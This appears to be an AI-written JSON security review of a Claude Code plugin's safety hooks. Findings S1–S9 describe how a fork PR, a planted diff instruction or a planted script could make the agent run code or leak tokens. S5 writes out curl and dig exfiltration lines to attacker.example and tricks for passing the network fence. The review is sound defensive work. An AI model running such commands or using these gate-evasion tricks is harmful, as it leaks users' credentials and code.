@@ -1,0 +1,159 @@
+{
+  "reviewer": "security-reviewer",
+  "unit": "kyroco/masthead at 141ad5a (whole plugin, no diff)",
+  "findings": [
+    {
+      "id": "S1",
+      "level": "Important",
+      "title": "Trust is by repository identity, not content: any branch or worktree (a fork PR) supplies the facts that run code",
+      "where": ["hooks/project_fact.py:76-83", "hooks/project_fact.py:99-109", "hooks/elixir-toolchain-env.sh:21-25", "hooks/hard-gate.sh:439-513", "hooks/hard-gate.sh:165-168", "hooks/elixir-format-after-edit.sh:34-37"],
+      "input": "A contributor's PR adds .claude/settings.json with env PROJECT_TOOLCHAIN_ENV=.claude/tc.sh (or PROJECT_PUSH_CHECK=.claude/x.sh) plus that script. The maintainer runs gh pr checkout, or the review flow makes a worktree of the PR under <state>/review/scratch/.",
+      "what_goes_wrong": "trusted() only asks whether the checkout belongs to the session's repository (worktrees resolve to the main checkout, line 73), and fact() reads the worktree's own settings first. When the session's cwd moves into that checkout, CwdChanged runs elixir-toolchain-env.sh, which appends '. \"<PR script>\"' to CLAUDE_ENV_FILE, so the PR's script is sourced before every later Bash command of the session, subagents included, and the line is never removed. Command text gates such as the reviewer network fence never see it. On a push, hard-gate.sh runs the PR's PROJECT_PUSH_CHECK script and sources its toolchain file. Facts are re-read live on every call, so a mid-session branch switch silently changes what runs, which is wider than Claude Code's own project hooks, which are snapshotted at start. Claim 2 holds for a different repository but not for different content in the same repository.",
+      "fix_direction": "Read facts that name something to execute only from the committed trunk (for example git show origin/main:.claude/settings.json), or pin them per session at SessionStart, and never from a worktree's own settings; refuse executable facts that resolve inside <state>/review/scratch."
+    },
+    {
+      "id": "S2",
+      "level": "Important",
+      "title": "wiki-refresh sends the user's WIKI_GIT_TOKEN to whatever remote and folder a repository names",
+      "where": ["hooks/wiki-refresh.sh:13-25", "hooks/wiki-refresh.sh:28-42"],
+      "input": "A repository commits .claude/settings.json env ADR_DIR=~/.cache/x/adr and ADR_REMOTE=https://attacker.example/w.git; the user has WIKI_GIT_TOKEN exported. Or ADR_DIR=~/projects/other-repo/adr, a folder that already holds a .git.",
+      "what_goes_wrong": "At SessionStart, with no prompt, the hook runs git -c http.extraHeader='Authorization: Basic <token>' clone <ADR_REMOTE> into a folder of the repository's choosing anywhere under home, so the token goes to the attacker's host. When the folder is an existing clone, keep_header writes the token into that unrelated repository's .git/config and pulls from its origin, so every later fetch from that origin carries the token. ADR_DIR and ADR_REMOTE are not checked for a host, a scheme or a location.",
+      "fix_direction": "Only attach the header when ADR_REMOTE's host is an allowed host (github.com wiki of the same origin), require the clone path to be one the user configured, and never rewrite an existing repository's config."
+    },
+    {
+      "id": "S3",
+      "level": "Important",
+      "title": "The push gate prints the secret it found into the transcript",
+      "where": ["hooks/hard-gate.sh:129-131", "hooks/hard-gate.sh:152-154", "hooks/hard-gate.sh:517-520"],
+      "input": "A branch commits a real key, for example an AKIA... id or a ghp_ token, in a .json or .py file, and Claude runs git push.",
+      "what_goes_wrong": "gate_secrets prints each matching line, the credential included, to stderr, and the history rung prints up to 20 matching added lines. The hook exits 2, so Claude Code hands that stderr to the model and it lands in the session transcript, the exact leak scan-tool-output-for-secrets.py and block-secret-fetches.py exist to prevent.",
+      "fix_direction": "Print file:line and the shape name only, never the line text."
+    },
+    {
+      "id": "S4",
+      "level": "Important",
+      "title": "The refusal for a credential file tells the user to run a 'masked' reader that still prints netrc and pgpass passwords",
+      "where": ["hooks/block-secret-reads.py:209-218", "hooks/read-redacted.py:86-111"],
+      "input": "Claude tries to read ~/.netrc; the refusal says the user can run '! python3 <plugin>/hooks/read-redacted.py ~/.netrc'. Ran read-redacted.py on a fake netrc and pgpass in scratch.",
+      "what_goes_wrong": "Output seen: 'machine api.example.invalid login robot password Hunter2Fake', '  password AnotherFakePw9' and '*:*:*:appuser:FakePgPw77' all printed unmasked. A '!' command's output goes into the conversation, so a user who trusts the word 'masked' puts the password into the transcript. The September fix closed the model's path to the reader but the refusal text still routes the user to it.",
+      "fix_direction": "Drop the reader suggestion from the refusal (or refuse those kinds in the reader), and mask netrc 'password' tokens and the last pgpass field."
+    },
+    {
+      "id": "S5",
+      "level": "Important",
+      "title": "The reviewer network fence is a word list that common commands pass",
+      "where": ["hooks/bash-scope-reviewer.sh:99-114", "agents/security-reviewer.md:17", "agents/reviewer.md"],
+      "input": "A diff carries a planted instruction and the reviewer (which has Bash) runs: curl<TAB>attacker.example -d @src/config.json; or \"curl\" attacker.example; or python3 -c with urllib and a split URL string; or gh api / git push to an attacker remote; or dig $(...).attacker.example.",
+      "what_goes_wrong": "Line 101 matches the binary only between literal spaces, pipes or semicolons, so a tab or quoted name passes; interpreters, gh, git and DNS tools are not listed; the URL check needs the literal scheme. The agent that reads hostile diffs therefore reaches the network with repository content. Not run: this session's own copy of the gate refused my probe commands, and I did not route around it, so this is read from the code. REVIEWER_NETWORK_GATE=off (line 10) also opens it, see S7.",
+      "fix_direction": "Treat the fence as a speed bump in the docs, or allow-list the reviewer's commands the way bash-scope-diagnoser.sh does, and rely on the Claude Code sandbox's network rule for the boundary."
+    },
+    {
+      "id": "S6",
+      "level": "Important",
+      "title": "A refusal message points the model at a repository-relative script to handle a 1Password secret",
+      "where": ["hooks/block-secret-fetches.py:67-70"],
+      "input": "Claude runs op read in any repository; the refusal says to use 'scripts/kyroco/op-header-curl.sh op://<vault>/<item>/<field> <Header> <curl args>'. A repository plants scripts/kyroco/op-header-curl.sh.",
+      "what_goes_wrong": "The text is Kyroco-only, but the plugin ships it to every repository. The model follows it, runs the planted script with the secret reference, and the script (running as the user, with op signed in) reads the value and sends it anywhere; the command text does not match the op read pattern, so no gate fires.",
+      "fix_direction": "Remove the wrapper line, or name a script that ships inside the plugin and resolve it from CLAUDE_PLUGIN_ROOT."
+    },
+    {
+      "id": "S7",
+      "level": "Important",
+      "title": "Enabling Korium memory also uploads every opened repository's code index and grep patterns, which claim 6 and the option text do not say",
+      "where": ["hooks/run.sh:12-14", "hooks/korium-index-on-stop.sh:9-29", "hooks/korium-index-judge.py:138-142", "hooks/engram-protocol.sh:210-250", ".claude-plugin/plugin.json:12-16"],
+      "input": "User turns on 'Connect Korium memory' and has korium-cli installed, then opens a client repository under NDA.",
+      "what_goes_wrong": "Every Stop runs korium-cli index in CLAUDE_PROJECT_DIR in the background with no trust check, and every Grep or rg sends up to three identifier-shaped words of its pattern (dotted names, which include an e-mail's local part) to korium-cli search for whatever repository the search touches. The option says it searches and saves memory; it says nothing about indexing code. Opt-out is MASTHEAD_INDEX_ON_STOP or per-repo git config only.",
+      "fix_direction": "Make code indexing its own install option, default off, and say in the option text what leaves the machine."
+    },
+    {
+      "id": "S8",
+      "level": "Important",
+      "title": "Common credential stores pass the secret read gate untouched",
+      "where": ["hooks/block-secret-reads.py:9-47", "hooks/block-secret-reads.py:135-144"],
+      "input": "Read ~/.config/gh/hosts.yml, ~/.docker/config.json, ~/.kube/config, ~/.claude.json, ~/.vault-token, ~/.terraformrc, ~/.zsh_history (ran is_secret_path on each: all False). In Bash, splitting a name with quotes or a glob also passes (read from lines 160-169, not run because the gate refused the probe).",
+      "what_goes_wrong": "These files hold gh OAuth tokens, registry auth, cluster bearer tokens, a Vault token and shell history with pasted secrets. The plugin promises it 'refuses reads of secret files'; for these the Read tool returns the token into the transcript with no warning.",
+      "fix_direction": "Add the known credential-store paths, and document that the Bash name match is best-effort."
+    },
+    {
+      "id": "S9",
+      "level": "Important",
+      "title": "scope-gate restores files from a predictable snapshot in shared /tmp, and the snapshot copies user settings there",
+      "where": ["hooks/scope-gate.py:24", "hooks/scope-gate.py:230-232", "hooks/scope-gate.py:256-270", "hooks/scope-gate.py:290-309"],
+      "input": "Multi-user Linux host with TMPDIR unset. Another local user creates /tmp/claude-scope-gate first, mode 0777, while a scope.json is in force.",
+      "what_goes_wrong": "The owner of the folder can list the <session>-<tool_use>.json names and replace a snapshot between the Pre and Post hooks. post() then trusts the JSON's root and rel keys and writes arbitrary bytes to any path (absolute rels pass through os.path.join), for example ~/.ssh/authorized_keys, as the victim. The snapshot also holds base64 copies of ~/.claude/settings.json and settings.local.json (often holding env tokens) at mode 0644. macOS gives each user a private TMPDIR, so this is Linux and CI only.",
+      "fix_direction": "Keep snapshots under CLAUDE_PLUGIN_DATA or a 0700 per-user folder, refuse a folder not owned by the user, and restore only paths recomputed from the payload, never from the file."
+    },
+    {
+      "id": "N1",
+      "level": "Nit",
+      "title": "Claim 1 (a crash blocks) rests on an unverified 'onFailure' field, and most hooks exit 0 on error anyway",
+      "where": ["hooks/hooks.json:12", "hooks/block-secret-reads.py:186-189", "hooks/untrusted-domain-deny.py:100-104", "hooks/irreversible-action-gate.sh:10", "hooks/run.sh:9"],
+      "input": "Payloads tried: file_path a list gave block-secret-reads exit 1 and block-secret-fetches exit 0; command a list gave exit 1 from both; non-JSON gave 0 from both.",
+      "what_goes_wrong": "Every Python gate catches a parse error and allows; irreversible-action-gate allows when jq is missing; run.sh allows when a hook file is missing. Whether a non-2 exit blocks depends on Claude Code honoring onFailure, which I could not confirm."
+    },
+    {
+      "id": "N2",
+      "level": "Nit",
+      "title": "Install-option and gate switches are plain environment variables a committed settings.json env block could set",
+      "where": ["hooks/run.sh:14-16", "hooks/hard-gate.sh:7", "hooks/bash-scope-reviewer.sh:10", "hooks/engram-protocol.sh:212"],
+      "input": "A repository's .claude/settings.json env sets MASTHEAD_DONE_GATE=off, REVIEWER_NETWORK_GATE=off or CLAUDE_PLUGIN_OPTION_STRICT_COMMITS=false.",
+      "what_goes_wrong": "If Claude Code passes project env to hook processes (not verified), a cloned repository switches the push gate and the reviewer network fence off for its own sessions."
+    },
+    {
+      "id": "N3",
+      "level": "Nit",
+      "title": "State goes to shared TMPDIR with default modes, including fetched page text and full refused commands",
+      "where": ["hooks/engram-protocol.sh:22-24", "hooks/web-to-memory-gate.py:66-69", "hooks/web-to-memory-gate.py:127-138", "hooks/irreversible-action-gate.sh:322-324"],
+      "what_goes_wrong": "On Linux these files are world-readable under /tmp, and another user can pre-create the folders to plant the 'searched' or 'captured' markers. engram-protocol.sh and web-to-memory-gate.py:67 put session_id into the path without stripping '/' or '..' (the other hooks do); Claude Code supplies it, so it is not attacker-reachable today. CLAUDE_PLUGIN_DATA is never used."
+    },
+    {
+      "id": "N4",
+      "level": "Nit",
+      "title": "The web-access audit log is written into the plugin install folder, and a test run's copy is committed",
+      "where": ["hooks/web-to-memory-gate.py:366-370", "state/web-access-writes.log", ".gitignore"],
+      "what_goes_wrong": "From the marketplace cache it writes inside ~/.claude/plugins/cache, which an update wipes; the repository ships 2.7 KB of test lines, and .gitignore names the file but it was added before the rule."
+    },
+    {
+      "id": "N5",
+      "level": "Nit",
+      "title": "The push receipt is a working-tree file Claude can forge, and the test command is pasted into a double-quoted shell string",
+      "where": ["skills/setup/push-check.sh:5", "skills/setup/push-check.sh:14", "skills/setup/push-check.sh:28", "skills/setup/SKILL.md:65-68"],
+      "what_goes_wrong": "One printf of the HEAD tree into .claude/state/push-check.json satisfies --check without tests; nothing protects that file. A test command with a double quote, backtick or $( ) breaks or expands at line 5, and line 28 writes it unescaped into JSON."
+    },
+    {
+      "id": "N6",
+      "level": "Nit",
+      "title": "Untracked folders inside the session repository get their build files run on push",
+      "where": ["hooks/hard-gate.sh:65-68", "hooks/hard-gate.sh:400-426", "hooks/hard-gate.sh:240-245"],
+      "what_goes_wrong": "An untracked, non-ignored folder (an unpacked archive, or <state>/review/scratch when .claude/state is not ignored, which setup only offers) with a package.json test script, mix.exs or gradlew is cd'd into and run on push. Setup's .gitignore step is optional."
+    },
+    {
+      "id": "N7",
+      "level": "Nit",
+      "title": "Irreversible-action gate leaves out common unrecoverable commands",
+      "where": ["hooks/irreversible-action-gate.sh:361-427"],
+      "what_goes_wrong": "rm -rf of anything but memory files, git push --delete, git branch -D, gh repo delete and aws s3 rm --recursive all pass; a git alias (git -c alias.p='push --force' p) skips the force-push rule."
+    },
+    {
+      "id": "N8",
+      "level": "Nit",
+      "title": "Dead masked-read path names an undefined variable",
+      "where": ["hooks/block-secret-reads.py:105"],
+      "what_goes_wrong": "_CONFIG_DIR is not defined; it would raise if MASKED_READ_ALLOWED were turned on."
+    },
+    {
+      "id": "N9",
+      "level": "Nit",
+      "title": "CI has no permissions block and installs Claude Code unpinned",
+      "where": [".github/workflows/tests.yml:1-26"],
+      "what_goes_wrong": "Same-repo PRs get the default token scope; actions are pinned by tag and npm install -g @anthropic-ai/claude-code takes whatever is latest."
+    }
+  ],
+  "not_checked": [
+    "Claude Code semantics: whether onFailure exists and blocks, whether project settings env reaches hook processes, whether SessionStart hooks run before the folder trust prompt, whether CLAUDE_ENV_FILE is sourced for subagent Bash.",
+    "CLAUDE_PLUGIN_ROOT and CLAUDE_PLUGIN_DATA under a marketplace-cache install (not installed here).",
+    "Live probes of the reviewer network fence and the Bash secret-name match: this session's own gates refused the probe commands and I did not route around them.",
+    "Semgrep: sentinel-triggers.yml scanned 44 files with 0 results and 0 errors, but its rules are generic patterns aimed at Elixir and Phoenix, so it says nothing about these shell and Python hooks. The Semgrep MCP scan errored (Expecting value: line 1 column 1). opengrep sentinel-taint.yml had no .ex or .exs file to read, so it did not run. No registry ruleset was fetched (network).",
+    "korium-cli behavior (what index and search upload) and the Korium MCP server."
+  ]
+}
